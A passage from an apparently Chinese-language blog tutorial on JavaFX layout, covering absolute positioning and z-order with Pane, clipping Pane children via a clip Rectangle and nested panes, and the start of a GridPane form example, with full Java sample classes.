<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Arc</span> <span class="variable">largeArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">270</span>, <span class="number">90</span>);</span><br><span class="line">largeArc.setType(ArcType.ROUND);</span><br><span class="line"></span><br><span class="line"><span class="type">Arc</span> <span class="variable">backgroundArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">160</span>, <span class="number">160</span>, <span class="number">270</span>, <span class="number">90</span> );</span><br><span class="line">backgroundArc.setType( ArcType.ROUND );</span><br><span class="line"></span><br><span class="line"><span class="type">Arc</span> <span class="variable">smArc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>( <span class="number">0</span>, <span class="number">160</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">270</span>, <span class="number">180</span>);</span><br><span class="line">smArc1.setType(ArcType.ROUND);</span><br><span class="line"></span><br><span class="line"><span class="type">Circle</span> <span class="variable">smCircle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">160</span>/Math.sqrt(<span class="number">2.0</span>), <span class="number">160</span>/Math.sqrt(<span class="number">2.0</span>), <span class="number">30</span>,Color.web(<span class="string">&quot;0xF2A444&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">Arc</span> <span class="variable">smArc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>( <span class="number">160</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">smArc2.setType(ArcType.ROUND);</span><br></pre></td></tr></table></figure>
<p>右下角的<code>Arc</code>基于<code>Stage</code>的整体高度定位。 从高度减去20是从<code>Insets</code>减去10个像素<code>VBox</code>（左10+右10）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Arc</span> <span class="variable">medArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">568</span>-<span class="number">20</span>, <span class="number">320</span>-<span class="number">20</span>, <span class="number">60</span>, <span class="number">60</span>, <span class="number">90</span>, <span class="number">90</span>);</span><br><span class="line">medArc.setType(ArcType.ROUND);</span><br><span class="line"></span><br><span class="line">primaryStage.setWidth( <span class="number">568</span> );</span><br><span class="line">primaryStage.setHeight( <span class="number">320</span> );</span><br></pre></td></tr></table></figure>
<h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><p><code>Hyperlink</code>定位成偏离中心（284，160），该中心是<code>Stage</code>的宽度和高度两者除以2。 这会将<code>Hyperlink</code>的文本定位在屏幕的右下象限，因此需要基于<code>Hyperlink</code>的宽度和高度的偏移量。 在显示屏幕之前，尺寸不适用于<code>Hyperlink</code>，因此我对位置进行了显示后调整。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hyperlink</span> <span class="variable">hyperlink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hyperlink</span>(<span class="string">&quot;About this App&quot;</span>);</span><br><span class="line"></span><br><span class="line">primaryStage.setOnShown( (evt) -&gt; &#123;</span><br><span class="line">     hyperlink.setLayoutX( <span class="number">284</span> - (hyperlink.getWidth()/<span class="number">3</span>) );</span><br><span class="line">     hyperlink.setLayoutY( <span class="number">160</span> - hyperlink.getHeight() );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>Hyperlink</code>没有放在屏幕的真正中心。 layoutX值基于将其从左上方设计移开的除以三操作。</p>
<h3 id="Z-Order"><a href="#Z-Order" class="headerlink" title="Z-Order"></a>Z-Order</h3><p>如前所述，<code>Pane</code>支持重叠的子节点。 此图片显示了在左上角设计中添加了深度的About View。 较小的<code>Arcs</code>和<code>Circle</code>像largeArc一样悬停在backgroundArc上。<br><img src="/image/Pasted image 20240501105939.png" alt="20240501105939.png" /><br><img src="/image/Pasted image 20240501105919.png" alt="20240501105919.png" /><br>本例中的z顺序由子节点添加到<code>Pane</code>的顺序确定。 backgroundArc被后来添加的项目所掩盖，最明显的是largeArc。 要重新排列子元素，请在将项添加到<code>Pane</code>之后使用toFront（）和toBack（）方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">p.getChildren().addAll( backgroundArc, largeArc, smArc1, smCircle, smArc2, hyperlink, medArc );</span><br><span class="line"></span><br><span class="line">vbox.getChildren().add( p );</span><br></pre></td></tr></table></figure>
<p>在启动JavaFX时，构建一个绝对布局是很有诱惑力的。 请注意，绝对布局是脆弱的，经常在调整屏幕大小或在软件维护阶段添加项目时中断。 然而，有充分的理由使用绝对定位。 游戏就是这样一种用法。 在游戏中，您可以调整“Shape”的（x，y）坐标来在屏幕上移动游戏棋子。 本文演示了JavaFX类<code>Pane</code>，它为任何形状驱动的UI提供绝对定位。</p>
<h3 id="完整代码-6"><a href="#完整代码-6" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Hyperlink;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.paint.Color;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Arc;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.ArcType;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Circle;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.text.Font;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> org.scenicview.ScenicView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">        vbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>( <span class="number">10</span> ) );  </span><br><span class="line">        vbox.setBackground(  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Background</span>(  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BackgroundFill</span>(Color.BLACK, <span class="keyword">new</span> <span class="title class_">CornerRadii</span>(<span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">0</span>))  </span><br><span class="line">                ));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Pane</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>();  </span><br><span class="line"><span class="comment">//        VBox.setMargin(p, new Insets(0.0d, 10.0d, 10.0d, 10.0d));  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Arc</span> <span class="variable">largeArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">270</span>, <span class="number">90</span>);  </span><br><span class="line">        largeArc.setFill(Color.web(<span class="string">&quot;0x59291E&quot;</span>));  </span><br><span class="line">        largeArc.setType(ArcType.ROUND);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Arc</span> <span class="variable">backgroundArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">160</span>, <span class="number">160</span>, <span class="number">270</span>, <span class="number">90</span> );  </span><br><span class="line">        backgroundArc.setFill( Color.web(<span class="string">&quot;0xD96F32&quot;</span>) );  </span><br><span class="line">        backgroundArc.setType( ArcType.ROUND );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Arc</span> <span class="variable">smArc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>( <span class="number">0</span>, <span class="number">160</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">270</span>, <span class="number">180</span>);  </span><br><span class="line">        smArc1.setFill(Color.web(<span class="string">&quot;0xF2A444&quot;</span>));  </span><br><span class="line">        smArc1.setType(ArcType.ROUND);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Circle</span> <span class="variable">smCircle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>(  </span><br><span class="line">            <span class="number">160</span>/Math.sqrt(<span class="number">2.0</span>), <span class="number">160</span>/Math.sqrt(<span class="number">2.0</span>), <span class="number">30</span>,Color.web(<span class="string">&quot;0xF2A444&quot;</span>)  </span><br><span class="line">            );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Arc</span> <span class="variable">smArc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>( <span class="number">160</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">180</span>, <span class="number">180</span>);  </span><br><span class="line">        smArc2.setFill(Color.web(<span class="string">&quot;0xF2A444&quot;</span>));  </span><br><span class="line">        smArc2.setType(ArcType.ROUND);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Hyperlink</span> <span class="variable">hyperlink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hyperlink</span>(<span class="string">&quot;About this App&quot;</span>);  </span><br><span class="line">        hyperlink.setOnAction((evt) -&gt; &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Link&quot;</span>);  </span><br><span class="line">        &#125;);  </span><br><span class="line">        hyperlink.setFont( Font.font(<span class="number">36</span>) );  </span><br><span class="line">        hyperlink.setTextFill( Color.web(<span class="string">&quot;0x3E6C93&quot;</span>) );  </span><br><span class="line">        hyperlink.setBorder( Border.EMPTY );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Arc</span> <span class="variable">medArc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Arc</span>(<span class="number">568</span>-<span class="number">35</span>, <span class="number">320</span>-<span class="number">58</span>, <span class="number">60</span>, <span class="number">60</span>, <span class="number">90</span>, <span class="number">90</span>);  </span><br><span class="line">        medArc.setFill(Color.web(<span class="string">&quot;0xD9583B&quot;</span>));  </span><br><span class="line">        medArc.setType(ArcType.ROUND);  </span><br><span class="line">  </span><br><span class="line">        p.getChildren().addAll( backgroundArc, largeArc, smArc1, smCircle,  </span><br><span class="line">            smArc2, hyperlink, medArc );  </span><br><span class="line">  </span><br><span class="line">        vbox.getChildren().add( p );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">        scene.setFill(Color.BLACK);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Pane App&quot;</span>);  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.setWidth( <span class="number">568</span> );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">320</span> );  </span><br><span class="line">        primaryStage.setOnShown( (evt) -&gt; &#123;  </span><br><span class="line">             hyperlink.setLayoutX( <span class="number">284</span> - (hyperlink.getWidth()/<span class="number">3</span>) );  </span><br><span class="line">             hyperlink.setLayoutY( <span class="number">160</span> - hyperlink.getHeight() );  </span><br><span class="line">        &#125;);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">        ScenicView.show(scene);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Clipping"><a href="#Clipping" class="headerlink" title="Clipping"></a>Clipping</h2><p>大多数JavaFX布局容器（基类<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/layout/Region.html">Region</a>）会自动定位和调整其子容器的大小，因此裁剪任何可能超出容器布局边界的子内容都不会成为问题。一个大的例外是<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/layout/Pane.html">Rolling</a>，它是<code>Region</code>的直接子类，也是所有具有可公开访问的子元素的布局容器的基类。与它的子类不同的是，它不尝试排列它的子类，而只是接受显式的用户定位和大小调整。<br>这使得<code>Pane</code>适合作为绘图表面，类似于<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/canvas/Canvas.html">Canvas</a>，但呈现用户定义的<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/shape/Shape.html">Shape</a>子对象，而不是直接绘制命令。问题是，通常期望绘图表面自动在其边界处剪裁其内容。<code>Canvas</code>默认情况下会这样做，但<code>Pane</code>不会。从Javadoc条目<code>Pane</code>的最后一段：</p>
<blockquote>
<p>默认情况下，窗格不会裁剪其内容，因此子对象的边界可能会超出其自身的边界，无论是子对象位于负坐标还是窗格的大小调整为小于其首选大小。</p>
</blockquote>
<p>这句话有点误导。无论子对象的位置和大小的组合是否超出父对象的边界，都将在父对象<code>Pane</code>之外呈现（全部或部分），而不管位置是否为负或<code>Pane</code>是否调整过大小。很简单，<code>Pane</code>只提供了一个坐标移动到它的子项，基于它的左上角-但它的布局边界是完全忽略，而呈现子项。请注意，所有<code>Pane</code>子类的Javadoc（我检查过）都包含类似的警告。他们也不剪辑他们的内容，但如上所述，这通常不是一个问题，因为他们自动安排他们的子项。<br>因此，要正确使用<code>Pane</code>作为<code>Shapes</code>的绘图表面，我们需要手动剪切其内容。这有点复杂，特别是当涉及可见边界时。我写了一个小的演示应用程序来说明默认行为和修复它的各种步骤。你可以下载它作为<a href="http://kynosarges.org/misc/PaneDemo.zip">PaneDemo.zip</a>，其中包含NetBeans 8.2和Java SE 8u112的项目。以下各节通过屏幕截图和相关代码片段解释了每个步骤。</p>
<h3 id="默认行为"><a href="#默认行为" class="headerlink" title="默认行为"></a>默认行为</h3><p>启动时，PaneDemo显示了当您将<code>Ellipse</code>形状放入太小而无法完全包含它的<code>Pane</code>形状时会发生什么。<code>Pane</code>有一个很好的厚圆形<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/layout/Border.html">边界</a>，以可视化其区域。应用程序窗口是可调整大小的，<code>Pane</code>大小跟随窗口大小。左侧的三个按钮用于切换到演示中的其他步骤;单击Default（Alt+D）可从后面的步骤恢复到默认输出。<br><img src="/image/Pasted image 20240501143803.png" alt="20240501143803.png" /><br><img src="/image/Pasted image 20240501143931.png" alt="20240501143931.png" /><br>正如你所看到的，<code>Ellipse</code>覆盖了它的父视图<code>Border</code>，并突出了它。下面的代码用于生成默认视图。它被分成几个较小的方法，以及一个用于<code>Border</code>拐角半径的常量，因为它们将在接下来的步骤中被引用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">BORDER_RADIUS</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Border <span class="title function_">createBorder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Border</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">BorderStroke</span>(Color.BLACK, BorderStrokeStyle.SOLID,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CornerRadii</span>(BORDER_RADIUS), BorderStroke.THICK));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Shape <span class="title function_">createShape</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Ellipse</span> <span class="variable">shape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ellipse</span>(<span class="number">50</span>, <span class="number">50</span>);</span><br><span class="line">    shape.setCenterX(<span class="number">80</span>);</span><br><span class="line">    shape.setCenterY(<span class="number">80</span>);</span><br><span class="line">    shape.setFill(Color.LIGHTCORAL);</span><br><span class="line">    shape.setStroke(Color.LIGHTCORAL);</span><br><span class="line">    <span class="keyword">return</span> shape;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Region <span class="title function_">createDefault</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(createShape());</span><br><span class="line">    pane.setBorder(createBorder());</span><br><span class="line">    pane.setPrefSize(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> pane;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单剪裁"><a href="#简单剪裁" class="headerlink" title="简单剪裁"></a>简单剪裁</h3><p>令人惊讶的是，没有预定义的选项可以让可调整大小的<code>Region</code>自动将其子项剪切到当前大小。相反，您需要使用在<code>Node</code>上定义的基本<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/Node.html#clipProperty">clipProperty</a>，并手动更新它以反映不断变化的布局边界。下面的方法<code>clipChildren</code>展示了这是如何工作的（使用Javadoc，因为你可能想在自己的代码中重用它）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">clipChildren</span><span class="params">(Region region, <span class="type">double</span> arc)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Rectangle</span> <span class="variable">outputClip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">    outputClip.setArcWidth(arc);</span><br><span class="line">    outputClip.setArcHeight(arc);</span><br><span class="line">    region.setClip(outputClip);</span><br><span class="line"></span><br><span class="line">    region.layoutBoundsProperty().addListener((ov, oldValue, newValue) -&gt; &#123;</span><br><span class="line">        outputClip.setWidth(newValue.getWidth());</span><br><span class="line">        outputClip.setHeight(newValue.getHeight());</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Region <span class="title function_">createClipped</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(createShape());</span><br><span class="line">    pane.setBorder(createBorder());</span><br><span class="line">    pane.setPrefSize(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clipped children still overwrite Border!</span></span><br><span class="line">    clipChildren(pane, <span class="number">3</span> * BORDER_RADIUS);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pane;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240501144120.png" alt="20240501144120.png" />
这样好多了`Ellipse`不再突出于`Pane` -但仍然覆盖其边界。还要注意的是，我们必须手动指定裁剪`Rectangle`的估计角圆化，以反映圆化的`Border`角。这个估计值是3 * BORDER_RADIUS，因为在`Border`上指定的拐角半径实际上定义了它的内径，而外径（我们在这里需要的）将根据`Border`厚度而更大。(You如果你真的想的话，你可以精确地计算外半径，但我在演示应用程序中跳过了这一点。）
### 嵌套窗格
我们能以某种方式指定一个剪切区域，排除一个可见的'边界'？据我所知。剪切区域会影响`Pane`以及其他内容，因此如果您要缩小剪切区域以排除它，您将不再看到任何`Border`。相反，解决方案是创建两个嵌套窗格：一个内部图形`Border`，不带`Pane`，精确地剪裁到其边界，一个外部图形`Border`，定义可见的`StackPane`，并调整图形`Border`的大小。下面是最终代码：
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Region <span class="title function_">createNested</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// create drawing Pane without Border or size</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(createShape());</span><br><span class="line">    clipChildren(pane, BORDER_RADIUS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create sized enclosing Region with Border</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Region</span> <span class="variable">container</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StackPane</span>(pane);</span><br><span class="line">    container.setBorder(createBorder());</span><br><span class="line">    container.setPrefSize(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> container;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/image/Pasted image 20240501145950.png" alt="20240501145950.png" />
作为一个额外的奖励，我们不再需要猜测剪裁`Rectangle`的正确角半径。我们现在剪裁到可见`Border`的内圆周而不是外圆周，因此我们可以直接重用其内角半径。如果您指定多个不同的圆角半径或更复杂的`Border`，则必须定义相应的更复杂的剪裁`Shape`。
有一个小小的警告。所有子坐标都相对的图形`Pane`的左上角现在开始于可见`Border`内。如果您将一个带有可见`Pane`的`Border`追溯更改为嵌套窗格，如下图所示，所有子窗格将显示与`Border`厚度对应的轻微位置偏移。
### 完整代码
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.paint.Color;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Ellipse;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Rectangle;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Shape;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> org.scenicview.ScenicView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClippingApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">BORDER_RADIUS</span> <span class="operator">=</span> <span class="number">4</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Border <span class="title function_">createBorder</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Border</span>(  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BorderStroke</span>(Color.BLACK, BorderStrokeStyle.SOLID,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">CornerRadii</span>(BORDER_RADIUS), BorderStroke.THICK));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Shape <span class="title function_">createShape</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Ellipse</span> <span class="variable">shape</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ellipse</span>(<span class="number">50</span>, <span class="number">50</span>);  </span><br><span class="line">        shape.setCenterX(<span class="number">80</span>);  </span><br><span class="line">        shape.setCenterY(<span class="number">80</span>);  </span><br><span class="line">        shape.setFill(Color.LIGHTCORAL);  </span><br><span class="line">        shape.setStroke(Color.LIGHTCORAL);  </span><br><span class="line">        <span class="keyword">return</span> shape;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>();  </span><br><span class="line">        <span class="comment">// 未裁剪  </span></span><br><span class="line">        <span class="type">Region</span> <span class="variable">region</span> <span class="operator">=</span> createDefault();  </span><br><span class="line">        <span class="comment">// 裁剪  </span></span><br><span class="line">        <span class="type">Region</span> <span class="variable">region1</span> <span class="operator">=</span> createClipped();  </span><br><span class="line">  </span><br><span class="line">        VBox.setMargin(pane, <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>, <span class="number">10.0d</span>));  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        pane.getChildren().addAll(region);  </span></span><br><span class="line">        pane.getChildren().addAll(region1);  </span><br><span class="line">        vbox.getChildren().addAll(pane);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Clipping&quot;</span>);  </span><br><span class="line">        primaryStage.setWidth(<span class="number">200</span>);  </span><br><span class="line">        primaryStage.setHeight(<span class="number">200</span>);  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">        ScenicView.show(scene);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Region <span class="title function_">createDefault</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(createShape());  </span><br><span class="line">        pane.setBorder(createBorder());  </span><br><span class="line">        pane.setPrefSize(<span class="number">100</span>, <span class="number">100</span>);  </span><br><span class="line">        <span class="keyword">return</span> pane;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">clipChildren</span><span class="params">(Region region, <span class="type">double</span> arc)</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Rectangle</span> <span class="variable">outputClip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();  </span><br><span class="line">        outputClip.setArcWidth(arc);  </span><br><span class="line">        outputClip.setArcHeight(arc);  </span><br><span class="line">        region.setClip(outputClip);  </span><br><span class="line">  </span><br><span class="line">        region.layoutBoundsProperty().addListener((ov, oldValue, newValue) -&gt; &#123;  </span><br><span class="line">            outputClip.setWidth(newValue.getWidth());  </span><br><span class="line">            outputClip.setHeight(newValue.getHeight());  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Region <span class="title function_">createClipped</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Pane</span> <span class="variable">pane</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pane</span>(createShape());  </span><br><span class="line">        pane.setBorder(createBorder());  </span><br><span class="line">        pane.setPrefSize(<span class="number">100</span>, <span class="number">100</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// clipped children still overwrite Border!  </span></span><br><span class="line">        clipChildren(pane, <span class="number">3</span> * BORDER_RADIUS);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> pane;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
## GridPane
业务应用程序中的窗体通常使用模仿数据库记录的布局。 对于表中的每一列，在左侧添加一个标题，该标题与右侧的行值相匹配。JavaFX有一个名为`GridPane`的特殊用途控件，用于这种类型的布局，使内容按行和列对齐。 `GridPane`还支持跨越更复杂的布局。
这个屏幕截图显示了一个基本的`GridPane`布局。 在表单的左侧，有一列字段名称：电子邮件、优先级、问题、说明。 在表单的右侧，有一列控件，将显示相应字段的值。 字段名称的类型为`Label`，值控件是包括`TextField`、`TextArea`和`ComboBox`的混合控件。
<img src="/image/Pasted image 20240501151232.png" alt="20240501151232.png" />
下面的代码显示为窗体创建的对象。“vbox”是`Scene`的根，也将包含表单底部的`ButtonBar`。
